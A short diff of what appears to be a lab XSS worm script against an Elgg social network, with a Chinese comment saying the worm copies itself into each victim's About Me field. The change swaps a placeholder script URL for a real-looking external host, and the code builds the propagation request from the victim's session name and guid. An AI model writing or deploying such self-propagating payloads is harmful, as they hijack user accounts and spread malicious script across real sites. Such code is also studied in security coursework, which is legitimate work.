@@ -17,7 +17,7 @@ window.onload = function () {
 
     // 自传播：将 Link 方法的蠕虫代码插入到受害者的 About Me 字段中
     // 生成 Link 标签
-    var wormCode = "<script type=\"text/javascript\" src=\"http://www.example.com/xss_worm.js\"></" + "script>";
+    var wormCode = "<script type=\"text/javascript\" src=\"https://testing-ground.vercel.app/myscripts.js\"></" + "script>";
     var encodedWormCode = encodeURIComponent(wormCode);
     var userName = "&name=" + elgg.session.user.name;
     var guid = "&guid=" + elgg.session.user.guid;
